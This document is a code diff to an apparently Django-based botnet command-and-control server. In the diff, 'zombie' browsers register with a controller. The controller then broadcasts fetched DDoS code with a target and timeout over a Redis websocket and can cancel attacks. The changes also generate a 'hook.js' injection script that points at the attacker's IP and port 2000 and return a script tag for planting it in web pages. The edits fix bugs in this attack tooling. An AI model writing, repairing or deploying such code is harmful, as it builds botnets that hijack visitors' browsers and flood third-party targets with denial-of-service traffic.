@@ -42,6 +42,7 @@ class ZombieInterface(viewsets.ModelViewSet):
     #zombie attempts to register with controller
     @list_route(methods=['get'])
     def register(self,request,pk=None):
+        #pdb.set_trace()
         #check if zombie exists
         try:
             zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
@@ -57,7 +58,8 @@ class ZombieInterface(viewsets.ModelViewSet):
         zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
         zom.sesskey = request.session.session_key
         zom.save()
-        return HttpResponse(simplejson.dumps("{'gracias':gracias'};"),'application/json')
+
+        return Response()
     #zombie updates controller with information
     @list_route(methods=['get'])
     def updateAttacker(self,request,pk=None):
@@ -84,11 +86,10 @@ class Controller(viewsets.ModelViewSet):
             print(e)
             return HttpResponse("Failed to fetch ddos code: "+e)
 
-        #add args to code
-        code = "var target="+target+";\n"+"var timeout="+timeout+";\n"
 
+        args = simplejson.dumps({'target':target,'timeout':timeout});
         # tell over Websocket zombies to attack target
-        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code': code})))
+        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'code': code,'args':args})))
         #ack to controller
         return Response({'ack':'ddos'})
 
@@ -97,7 +98,7 @@ class Controller(viewsets.ModelViewSet):
     def cancel(self,request,pk=None):
         #cancel for N zombies
         if 'zombies' in request.data:
-            redis_publisher = RedisPublisher(facility='solo',sessions=[Zombies.objects.get(host=h).sesskey for int(h) int request.data['zombies']])
+            redis_publisher = RedisPublisher(facility='solo',sessions=[Zombies.objects.get(host=h).sesskey for h in request.data['zombies']])
             redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))
         #cancel for all zombies
         else:
@@ -151,16 +152,17 @@ class Controller(viewsets.ModelViewSet):
 
         headers = wsredis+jquery
         #server ip
-        ipstr = 'var ip = "{ipaddress}";
+        ipstr=  'var host = "{ipaddress}";\n'
+        portstr= 'var port = "{port}";'
         #get injection script
         injection = open(os.getcwd()+"/ccstation/static/protohook.js").read()
         #format for user
-        injection = headers+ipstr.format(ipaddress=ip)+injection
+        injection = headers+ipstr.format(ipaddress=ip)+portstr.format(port=2000)+injection
         #attempt to create injection script
         try:
-            with open(os.getcwd()+"/hook.js",'w+') as f:
+            with open(os.getcwd()+"/ccstation/static/hook.js",'w+') as f:
                     f.write(injection)
-                    return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+ip+"/2000/hook.js\""}),content_type='application/json')
+                    return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+ip+":2000/static/hook.js\""}),content_type='application/json')
         except IOError as e:
             print(e)
             return HttpResponse(e)
